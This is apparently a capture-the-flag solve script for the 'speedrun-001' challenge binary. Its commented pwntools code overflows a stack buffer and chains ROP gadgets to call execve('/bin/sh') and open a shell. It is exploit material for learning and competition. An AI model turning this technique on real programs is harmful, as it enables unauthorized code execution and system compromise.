from pwn import *
import struct

# speedrun-001 is a 64-bit statically linked binary
# NX is enabled; ASLR is turned on

# This is a basic full rop chain

target = process('./speedrun-001')
target.recvuntil(b'words?')

# Buffer overflow is 1032 bytes

# pop rax
# 0x0000000000415664
pop_rax = struct.pack("<Q", 0x0000000000415664)

# pop rdi
# 0x0000000000400686
pop_rdi = struct.pack("<Q", 0x0000000000400686)

# pop rsi
# 0x00000000004101f3
pop_rsi = struct.pack("<Q", 0x00000000004101f3)

# pop rdx
# 0x000000000044be16
pop_rdx = struct.pack("<Q", 0x000000000044be16)

# syscall 
# 0x000000000040129c
syscall = struct.pack("<Q", 0x000000000040129c)

# Putting '/bin/sh' in memory
# Writeable Memory Address (vmmap): 0x000000006b6000
# Move to memory gadget: 
# 0x000000000048d251: mov qword ptr [rax], rdx; ret;
writeable_memory_addr = struct.pack("<Q", 0x000000006b6000)
mov_to_mem = struct.pack("<Q", 0x000000000048d251)

bin_sh = b'/bin/sh\x00' # <-- This also works in this case btw --
#bin_sh = struct.pack("<Q", 0x0068732f6e69622f) # Doing it this way is just swapping the endianess twice

payload = b'a' * 1032

payload += pop_rax
payload += writeable_memory_addr
payload += pop_rdx
payload += bin_sh
payload += mov_to_mem

payload += pop_rax
payload += struct.pack("<Q", 0x3b)

payload += pop_rdi
payload += writeable_memory_addr

payload += pop_rsi
payload += struct.pack("<Q", 0x0)

payload += pop_rdx
payload += struct.pack("<Q", 0x0)

payload += syscall 


target.sendline(payload)
target.interactive()
